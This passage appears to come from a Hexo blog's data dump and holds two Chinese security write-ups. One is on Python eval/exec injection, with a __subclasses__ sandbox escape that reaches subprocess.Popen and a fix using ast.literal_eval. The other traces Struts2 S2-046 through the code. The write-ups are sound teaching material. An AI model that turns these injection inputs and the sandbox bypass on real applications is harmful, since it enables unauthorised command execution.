alt=\"3a0241441ac0df719001167c9e8dbc44.png\"></p>\n<p>我们可以在python中直接使用上图中的这些内建函数而不需要导入</p>\n<p>回到eval/exec问题中：值得注意的是，在eval/exec中，如果globals参数被提供，但是没有提供自定义的__builtins__，那么eval/exec会将当前环境中的__builtins__拷贝到自己提供的globals里，例子见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181349-ee3222cc-1747-1.png\" alt=\"ce4db27358b781ed836c3cb95f034f23.png\"></p>\n<p>由于没有自定义<strong>builtins__，因此使用当前环境中的__builtins__，而当前环境中的__builtins__的函数列表中存在__import__，因此可以直接使用__import</strong></p>\n<p>但是如果globals参数中使用了自定义的__builtins__，eval/exec则使用globals所指定的__builtins__，例如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181355-f1efd116-1747-1.png\" alt=\"d34277f880e9e284d7c0c5ba45e786a6.png\"></p>\n<p>上图指定globals为{‘<strong>builtins</strong>‘:{‘list’:list}}，因此在此eval中可以使用list内置函数，但是由于没有指定<strong>import</strong>,所以使用__import__时报错</p>\n<p>exec同样如此，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181403-f69bdbf6-1747-1.png\" alt=\"b527316cebd6de05393fc85535b3dd2a.png\"></p>\n<p>指定globals为{‘<strong>builtins</strong>‘:{‘list’:list}}，使用__import__时报错</p>\n<p>因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对__import__等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过</p>\n<h3 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h3><p>在上述防范中，通过globals参数对__builtins__中的内置函数范围进行限制，使得eval/exec无法随意使用”__import__”等内置函数来达成阻止任意代码执行</p>\n<p>但是却存在着如下的绕过：</p>\n<p>(1,2).<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()</p>\n<p>这里解释一下上面这串代码的含义</p>\n<p>“(1,2)”是一个元组</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181411-fb144b46-1747-1.png\" alt=\"2b2dd82e7180a13bcbc9d82da46e0a76.png\"></p>\n<p><strong>class</strong> 是用来查看对象所在的类</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181421-0145fd20-1748-1.png\" alt=\"e4b512c988eb91e3804e9be83916b2fb.png\"></p>\n<p>很显然”(1,2)”元组对象所对应的类是tuple</p>\n<p>__bases__属性返回所有直接父类所组成的元组。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181429-05d7350c-1748-1.png\" alt=\"de3600eaf834593b3910830b1df1badb.png\"></p>\n<p>如上图可见tuple类的直接父类是object类</p>\n<p>__subclasses__用来获取类的所有子类</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181437-0aad9d28-1748-1.png\" alt=\"5bf3c3b432f1a16189bde5be6bede9a1.png\"></p>\n<p>因为(1,2).<strong>class</strong>.<strong>bases</strong>[0]已经是object类了，而object类子类众多，因此可以使用的类就比较丰富了</p>\n<p>举个例子，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181444-0f12e224-1748-1.png\" alt=\"df7c89e9eab331f5b72463e22df45617.png\"></p>\n<p>上图红框中，也就是(1,2).<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[7],对应的类是list</p>\n<p>因此可以通过(1,2).<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[7]来使用list对数据进行处理，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181452-13a7cae8-1748-1.png\" alt=\"bb3656751aa7f58d74f8e7e2c5d2e2aa.png\"></p>\n<p>如上图所示，通(1,2).<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))将元组(1,2)转换成数组[1,2]</p>\n<p>在明白了原理之后可以发现，除了使用(1,2).<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))之外，还可以使用().<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))或[].<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))或””.<strong>class</strong>.<strong>bases__[0].__bases__[0].__subclasses</strong>()[7]((1,2))等等</p>\n<p>在上例中，由于str类的直接父类是basestring，basestring的直接父类才是object，而因此上述例子中需要使用””.<strong>class</strong>.<strong>bases__[0].__bases__[0].__subclasses</strong>()[7]((1,2))</p>\n<p>但构造利用链的核心方法就是：只要追溯到object类并使用<strong>subclasses</strong>()使用object类的子类即可</p>\n<p>我们查看下object的子类，找一找有没有能执行系统命令的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181506-1c0ac118-1748-1.png\" alt=\"566beed21499be9fc25452623809ebf6.png\"></p>\n<p>上图红框里有一个subprocess.Popen，很显然，我们可以通过这个来执行系统命令</p>\n<p>利用链如下</p>\n<p>().<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[176](“whoami”)</p>\n<p>这里的176是subprocess.Popen在object子类列表中的下标值</p>\n<p>实际效果如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181513-2044eb1e-1748-1.png\" alt=\"0440151554898a7d57d225400a6a4b1a.png\"></p>\n<p>可见,虽然限制只允许使用list,但是我们仍然可以执行系统命令</p>\n<p>因此，简单的使用{‘<strong>builtins</strong>‘: None}是无法满足eval的安全需求的</p>\n<p>实际上，可以使用ast.literal_eval()来代替eval()</p>\n<p>ast.literal_eval()允许传入的内容如下</p>\n<p>strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None</p>\n<p>当不合法的字符传入时，程序则会报错，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181521-253fbda6-1748-1.png\" alt=\"e8535ef76cfce3409f43cecc8bea9876.png\"></p>\n<p>使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞</p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><p>由于篇幅有限，这里先介绍第一组，后续文章会介绍其他有潜在安全隐患的函数。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。</p>\n<p>文中的知识点并非新知识，但我会围绕着基础点比较细致的分析漏洞的成因、防范以及绕过，希望对大家有帮助</p>","more":"<h1 id=\"第一组\"><a href=\"#第一组\" class=\"headerlink\" title=\"第一组\"></a><strong>第一组</strong></h1><p>首先介绍下python中常见的存在任意代码执行隐患的方法：eval与exec</p>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>在python中，eval和exec的用法极其相似。eval和exec都可以将传入的字符串执行，但两者又有不同之处：</p>\n<h3 id=\"eval\"><a href=\"#eval\" class=\"headerlink\" title=\"eval\"></a>eval</h3><p>eval是一个python内置函数，语法为eval(<em>expression</em>, <em>globals=None</em>,<em>locals=None</em>)</p>\n<p>eval函数接收三个参数：其中 expression<br>参数是用做运算的字符串类型表达式；globals参数用于指定运行时的全局命名空间；Locals参数用于指定运行时的局部命名空间。globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。</p>\n<h3 id=\"exec\"><a href=\"#exec\" class=\"headerlink\" title=\"exec\"></a>exec</h3><p>在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为exec(<em>object</em>[, <em>globals</em>[,<em>locals</em>]])</p>\n<p>exec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致</p>\n<p>关于二者的区别，可以见下面的几组代码</p>\n<p>1、eval与exec在执行 python语句上的不同</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181145-a4607d6a-1747-1.png\" alt=\"7e44ff01dfa10acb22e6ab4528e9c2c9.png\"></p>\n<p>Exec可以对变量a进行赋值操作</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181155-aa0a6096-1747-1.png\" alt=\"f799978a115968705906172096fa177f.png\"></p>\n<p>Eval并不能对变量a进行赋值</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181201-ae135dd2-1747-1.png\" alt=\"6c0efaabd67276a72f5705b1f887ecec.png\"></p>\n<p>Exec可以执行python语句”import os”</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181212-b47e45a6-1747-1.png\" alt=\"2717a5d529969f76d2451dbe47c2feaf.png\"></p>\n<p>eval不能直接执行python语句”import os”；eval可以执行表达式”<strong>import</strong>(‘os’)”并返回计算结果</p>\n<p>2、eval与exec在返回值上的不同</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181219-b8b8a490-1747-1.png\" alt=\"30524f3b1b371deaaab14bc93f07a16f.png\"></p>\n<p>eval在对表达式进行计算后，返回计算结果</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181226-bca73a30-1747-1.png\" alt=\"95efb3985c4719306cb4101924a93ecc.png\"></p>\n<p>exec并无返回结果</p>\n<p>虽然eval与exec存在着种种区别，但是他们都会将传入的第一个参数执行，这将有着潜在的任意代码执行隐患</p>\n<h2 id=\"存在的安全隐患\"><a href=\"#存在的安全隐患\" class=\"headerlink\" title=\"存在的安全隐患\"></a>存在的安全隐患</h2><p>在使用eval和exec时存在的安全隐患是极其相似的，因此下文代码中使用eval进行举例</p>\n<p>下图的代码addition方法使用eval对传入参数进行处理</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181232-c067b0d2-1747-1.png\" alt=\"4081f6061d9b86bd7205c2e80887c016.png\"></p>\n<p>Addition方法会将传入的a与b参数拼接”a+b”字符串并通过eval计算</p>\n<p>当a传入的参数为”<strong>import</strong>(‘os’).system(‘whoami’)”时,如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181241-c574aa76-1747-1.png\" alt=\"236478d04c99c592ec3da204a012de7b.png\"></p>\n<p>Eval执行的表达式为”<strong>import</strong>(‘os’).system(‘whoami’)+2”</p>\n<p>这将执行系统命令”whoami”并最终返回2</p>\n<p>这里有一个细节，为什么eval计算结果为2呢？</p>\n<p>因为<strong>import</strong>(‘os’).system(‘whoami’)结果为0，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181250-caca17c2-1747-1.png\" alt=\"038dc616d726193296e1173c489ee72b.png\"></p>\n<p>因此eval最终计算的表达式为”0+2”</p>\n<p>当然，在实际情况中，可以使用”#”将后续内容进行注释，通过传入”<strong>import</strong>(‘os’).system(‘whoami’)#”</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181304-d39359a4-1747-1.png\" alt=\"8b9f3ca5c6cc74886553832c4c125348.png\"></p>\n<p>最终eval需要执行的表达式为”<strong>import</strong>(‘os’).system(‘whoami’) # +2”</p>\n<p>由于最终相当于执行了”0 #+2”，所以返回值为0</p>\n<h2 id=\"防范\"><a href=\"#防范\" class=\"headerlink\" title=\"防范\"></a>防范</h2><p>从上述案例中可以发现，在通常情况下，只要传递给eval/exec中的变量可控，就存在执行系统命令的问题</p>\n<p>针对以上例子 eval(“<strong>import</strong>(‘os’).system(‘whoami’)”)问题时，存在一种常见的限制方法：即指定 eval 的globals参数为 {‘<strong>builtins</strong>‘: None} 或者 {‘<strong>builtins</strong>‘: {}}这样的形式</p>\n<p>上文只是简单的介绍了eval/exec中globals这个参数，接下来详细说明下为什么将eval<br>/exec中globals参数设置为 {‘<strong>builtins</strong>‘: None} 或者 {‘<strong>builtins</strong>‘: {}}这样的形式就可以避免任意代码执行的隐患</p>\n<p>在eval 与exec中，globals参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间。</p>\n<p>举个简单的例子如下：</p>\n<p>当globals参数没有被提供时，如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181314-d94c1ebc-1747-1.png\" alt=\"0cc2c1200cb544e417357d5c823b768e.png\"></p>\n<p>当globals参数没有被提供时，eval使用python的全局命名空间。这里的a为1，eval结果为2</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181323-de82e32a-1747-1.png\" alt=\"8a7ab13c53c4a723eedcfd3e632cbda6.png\"></p>\n<p>当globals参数被提供即globals为{‘a’:2}时，这时候eval的作用域就是{‘a’:2}字典所指定，这里的a为1，eval结果为2</p>\n<p>当globals被指定时，eval只使用globals参数所提供的字典里的数据，并不使用模块中的全局命名空间，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181334-e54623f2-1747-1.png\" alt=\"e4596dc67fef58c13bbe166b4338ea89.png\"></p>\n<p>即使我们定义了模块全局命名空间中b变量为2，但在由于eval使用globals参数指定全局命名空间为{‘a’:2}里没有声明变量b，因此程序报出”name ‘b’ is not defined”的错误</p>\n<p>接下来要介绍一下__builtins__模块</p>\n<p>__builtins__模块提供对Python的所有“内建”标识符的直接访问的功能。Python解释器在启动的时候会首先加载内建名称空间并自动导入所对应的内建函数。</p>\n<p>由于<strong>builtins__的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、__import</strong> 等</p>\n<p>加载__builtins__自动导入的内建函数列表如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181342-ea00139e-1747-1.png\" alt=\"3a0241441ac0df719001167c9e8dbc44.png\"></p>\n<p>我们可以在python中直接使用上图中的这些内建函数而不需要导入</p>\n<p>回到eval/exec问题中：值得注意的是，在eval/exec中，如果globals参数被提供，但是没有提供自定义的__builtins__，那么eval/exec会将当前环境中的__builtins__拷贝到自己提供的globals里，例子见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181349-ee3222cc-1747-1.png\" alt=\"ce4db27358b781ed836c3cb95f034f23.png\"></p>\n<p>由于没有自定义<strong>builtins__，因此使用当前环境中的__builtins__，而当前环境中的__builtins__的函数列表中存在__import__，因此可以直接使用__import</strong></p>\n<p>但是如果globals参数中使用了自定义的__builtins__，eval/exec则使用globals所指定的__builtins__，例如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181355-f1efd116-1747-1.png\" alt=\"d34277f880e9e284d7c0c5ba45e786a6.png\"></p>\n<p>上图指定globals为{‘<strong>builtins</strong>‘:{‘list’:list}}，因此在此eval中可以使用list内置函数，但是由于没有指定<strong>import</strong>,所以使用__import__时报错</p>\n<p>exec同样如此，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181403-f69bdbf6-1747-1.png\" alt=\"b527316cebd6de05393fc85535b3dd2a.png\"></p>\n<p>指定globals为{‘<strong>builtins</strong>‘:{‘list’:list}}，使用__import__时报错</p>\n<p>因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对__import__等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过</p>\n<h3 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h3><p>在上述防范中，通过globals参数对__builtins__中的内置函数范围进行限制，使得eval/exec无法随意使用”__import__”等内置函数来达成阻止任意代码执行</p>\n<p>但是却存在着如下的绕过：</p>\n<p>(1,2).<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()</p>\n<p>这里解释一下上面这串代码的含义</p>\n<p>“(1,2)”是一个元组</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181411-fb144b46-1747-1.png\" alt=\"2b2dd82e7180a13bcbc9d82da46e0a76.png\"></p>\n<p><strong>class</strong> 是用来查看对象所在的类</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181421-0145fd20-1748-1.png\" alt=\"e4b512c988eb91e3804e9be83916b2fb.png\"></p>\n<p>很显然”(1,2)”元组对象所对应的类是tuple</p>\n<p>__bases__属性返回所有直接父类所组成的元组。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181429-05d7350c-1748-1.png\" alt=\"de3600eaf834593b3910830b1df1badb.png\"></p>\n<p>如上图可见tuple类的直接父类是object类</p>\n<p>__subclasses__用来获取类的所有子类</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181437-0aad9d28-1748-1.png\" alt=\"5bf3c3b432f1a16189bde5be6bede9a1.png\"></p>\n<p>因为(1,2).<strong>class</strong>.<strong>bases</strong>[0]已经是object类了，而object类子类众多，因此可以使用的类就比较丰富了</p>\n<p>举个例子，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181444-0f12e224-1748-1.png\" alt=\"df7c89e9eab331f5b72463e22df45617.png\"></p>\n<p>上图红框中，也就是(1,2).<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[7],对应的类是list</p>\n<p>因此可以通过(1,2).<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[7]来使用list对数据进行处理，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181452-13a7cae8-1748-1.png\" alt=\"bb3656751aa7f58d74f8e7e2c5d2e2aa.png\"></p>\n<p>如上图所示，通(1,2).<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))将元组(1,2)转换成数组[1,2]</p>\n<p>在明白了原理之后可以发现，除了使用(1,2).<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))之外，还可以使用().<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))或[].<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[7]((1,2))或””.<strong>class</strong>.<strong>bases__[0].__bases__[0].__subclasses</strong>()[7]((1,2))等等</p>\n<p>在上例中，由于str类的直接父类是basestring，basestring的直接父类才是object，而因此上述例子中需要使用””.<strong>class</strong>.<strong>bases__[0].__bases__[0].__subclasses</strong>()[7]((1,2))</p>\n<p>但构造利用链的核心方法就是：只要追溯到object类并使用<strong>subclasses</strong>()使用object类的子类即可</p>\n<p>我们查看下object的子类，找一找有没有能执行系统命令的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181506-1c0ac118-1748-1.png\" alt=\"566beed21499be9fc25452623809ebf6.png\"></p>\n<p>上图红框里有一个subprocess.Popen，很显然，我们可以通过这个来执行系统命令</p>\n<p>利用链如下</p>\n<p>().<strong>class</strong>.<strong>bases__[0].__subclasses</strong>()[176](“whoami”)</p>\n<p>这里的176是subprocess.Popen在object子类列表中的下标值</p>\n<p>实际效果如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181513-2044eb1e-1748-1.png\" alt=\"0440151554898a7d57d225400a6a4b1a.png\"></p>\n<p>可见,虽然限制只允许使用list,但是我们仍然可以执行系统命令</p>\n<p>因此，简单的使用{‘<strong>builtins</strong>‘: None}是无法满足eval的安全需求的</p>\n<p>实际上，可以使用ast.literal_eval()来代替eval()</p>\n<p>ast.literal_eval()允许传入的内容如下</p>\n<p>strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None</p>\n<p>当不合法的字符传入时，程序则会报错，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181521-253fbda6-1748-1.png\" alt=\"e8535ef76cfce3409f43cecc8bea9876.png\"></p>\n<p>使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞</p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><p>由于篇幅有限，这里先介绍第一组，后续文章会介绍其他有潜在安全隐患的函数。</p>"},{"title":"Struts2 S2-046漏洞——045的同分异构体分析","date":"2019-08-17T10:21:25.000Z","cover":"https://s2.ax1x.com/2019/12/30/lQSPU0.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nApache Struts2存在远程代码执行漏洞，使用恶意的Content-Disposition值或者使用不合适的Content-Length头将payload传递给存在漏洞的服务器，将导致任意代码执行漏洞\n\n<!--more-->\n\n漏洞分析\n--------\n\n本次漏洞与S2-045(CVE-2017-5638)极其的相似，S2-046与S2-045都是在请求中构造错误的数据，触发struts2的异常处理机制(buildErrorMessage),而buildErrorMessage又会将报错信息中的ognl表达式进行执行，从而产生了漏洞\n\n但不同的是S2-045是通过错误的Content-Type字段，而S2-046利用的则是错误的上传文件信息\n\n因此这里着重讲一下S2-046与S2-045的不同之处。关于最终执行代码的执行点，二者是完全一样的，因此可以参考我之前的分析文章，在这里就不详细说明了\n\nS2-046漏洞的poc如下\n\n![lQSSDs.png](https://s2.ax1x.com/2019/12/30/lQSSDs.png)\n\n从poc中可见，构造了一个含有payload的上传文件名，并且文件名中含有”\\\\x00”\n\n我们首先在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求\n\n![lMzvvQ.png](https://s2.ax1x.com/2019/12/30/lMzvvQ.png)\n\n上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支\n\n跟入prepare.wrapRequest\n\n![lMzzuj.png](https://s2.ax1x.com/2019/12/30/lMzzuj.png)\n\n在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理\n\n![lQSi5V.png](https://s2.ax1x.com/2019/12/30/lQSi5V.png)\n\n见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例\n\n继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图\n\n![lQSA8U.png](https://s2.ax1x.com/2019/12/30/lQSA8U.png)\n\n可见request请求被传入上图84行中parse方法中\n\n继续跟入parse方法\n\n![lQSkCT.png](https://s2.ax1x.com/2019/12/30/lQSkCT.png)\n\n上图红框处，可见程序使用processUpload方法处理上传请求\n\n跟入processUpload方法\n\n![lQSE2F.png](https://s2.ax1x.com/2019/12/30/lQSE2F.png)\n\n从上图可见，processUpload方法调用processFileField方法对item进行处理，而item是上传的文件信息\n\n跟入processFileField\n\n![lQSeKJ.png](https://s2.ax1x.com/2019/12/30/lQSeKJ.png)\n\nprocessFileField将会处理上传的文件信息\n\n继续跟入getName方法\n\n![lQSCEq.png](https://s2.ax1x.com/2019/12/30/lQSCEq.png)\n\ngetName方法调用Streams.checkFileName处理文件名，而文件名正是我们构造的payload\n\n跟入checkFileName\n\n![lMzjgg.png](https://s2.ax1x.com/2019/12/30/lMzjgg.png)\n\ncheckFileName会验证fileName参数中是否存在”\\\\u0000”,很显然，我们的payload中构造了这个字段，程序会因此抛出异常\n\n之后的异常处理以及代码执行步骤，与S2-052完全一致，这里不详细说明了","source":"_posts/s2-46.md","raw":"---\ntitle: Struts2 S2-046漏洞——045的同分异构体分析\ndate: 2019-8-17 18:21:25\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://s2.ax1x.com/2019/12/30/lQSPU0.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nApache Struts2存在远程代码执行漏洞，使用恶意的Content-Disposition值或者使用不合适的Content-Length头将payload传递给存在漏洞的服务器，将导致任意代码执行漏洞\n\n<!--more-->\n\n漏洞分析\n--------\n\n本次漏洞与S2-045(CVE-2017-5638)极其的相似，S2-046与S2-045都是在请求中构造错误的数据，触发struts2的异常处理机制(buildErrorMessage),而buildErrorMessage又会将报错信息中的ognl表达式进行执行，从而产生了漏洞\n\n但不同的是S2-045是通过错误的Content-Type字段，而S2-046利用的则是错误的上传文件信息\n\n因此这里着重讲一下S2-046与S2-045的不同之处。关于最终执行代码的执行点，二者是完全一样的，因此可以参考我之前的分析文章，在这里就不详细说明了\n\nS2-046漏洞的poc如下\n\n![lQSSDs.png](https://s2.ax1x.com/2019/12/30/lQSSDs.png)\n\n从poc中可见，构造了一个含有payload的上传文件名，并且文件名中含有”\\\\x00”\n\n我们首先在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求\n\n![lMzvvQ.png](https://s2.ax1x.com/2019/12/30/lMzvvQ.png)\n\n上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支\n\n跟入prepare.wrapRequest\n\n![lMzzuj.png](https://s2.ax1x.com/2019/12/30/lMzzuj.png)\n\n在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理\n\n![lQSi5V.png](https://s2.ax1x.com/2019/12/30/lQSi5V.png)\n\n见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例\n\n继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图\n\n![lQSA8U.png](https://s2.ax1x.com/2019/12/30/lQSA8U.png)\n\n可见request请求被传入上图84行中parse方法中\n\n继续跟入parse方法\n\n![lQSkCT.png](https://s2.ax1x.com/2019/12/30/lQSkCT.png)\n\n上图红框处，可见程序使用processUpload方法处理上传请求\n\n跟入processUpload方法\n\n![lQSE2F.png](https://s2.ax1x.com/2019/12/30/lQSE2F.png)\n\n从上图可见，processUpload方法调用processFileField方法对item进行处理，而item是上传的文件信息\n\n跟入processFileField\n\n![lQSeKJ.png](https://s2.ax1x.com/2019/12/30/lQSeKJ.png)\n\nprocessFileField将会处理上传的文件信息\n\n继续跟入getName方法\n\n![lQSCEq.png](https://s2.ax1x.com/2019/12/30/lQSCEq.png)\n\ngetName方法调用Streams.checkFileName处理文件名，而文件名正是我们构造的payload\n\n跟入checkFileName\n\n![lMzjgg.png](https://s2.ax1x.com/2019/12/30/lMzjgg.png)\n\ncheckFileName会验证fileName参数中是否存在”\\\\u0000”,很显然，我们的payload中构造了这个字段，程序会因此抛出异常\n\n之后的异常处理以及代码执行步骤，与S2-052完全一致，这里不详细说明了","slug":"s2-46","published":1,"updated":"2020-10-27T09:25:29.685Z","_id":"ckgrozu9v004ewsa97bz90wkw","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Apache Struts2存在远程代码执行漏洞，使用恶意的Content-Disposition值或者使用不合适的Content-Length头将payload传递给存在漏洞的服务器，将导致任意代码执行漏洞</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本次漏洞与S2-045(CVE-2017-5638)极其的相似，S2-046与S2-045都是在请求中构造错误的数据，触发struts2的异常处理机制(buildErrorMessage),而buildErrorMessage又会将报错信息中的ognl表达式进行执行，从而产生了漏洞</p>\n<p>但不同的是S2-045是通过错误的Content-Type字段，而S2-046利用的则是错误的上传文件信息</p>\n<p>因此这里着重讲一下S2-046与S2-045的不同之处。关于最终执行代码的执行点，二者是完全一样的，因此可以参考我之前的分析文章，在这里就不详细说明了</p>\n<p>S2-046漏洞的poc如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lQSSDs.png\" alt=\"lQSSDs.png\"></p>\n<p>从poc中可见，构造了一个含有payload的上传文件名，并且文件名中含有”\\x00”</p>\n<p>我们首先在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMzvvQ.png\" alt=\"lMzvvQ.png\"></p>\n<p>上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支</p>\n<p>跟入prepare.wrapRequest</p>\n<p><img src= \"/img/loading.gif\" 